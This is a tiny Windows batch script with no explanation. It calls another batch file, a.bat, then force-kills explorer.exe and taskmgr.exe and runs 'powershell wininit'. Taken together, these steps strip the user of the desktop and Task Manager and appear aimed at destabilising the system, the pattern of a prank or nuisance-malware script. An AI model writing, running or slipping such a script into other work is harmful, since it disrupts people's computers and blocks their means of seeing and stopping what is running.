@echo off
a.bat
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe
powershell wininit
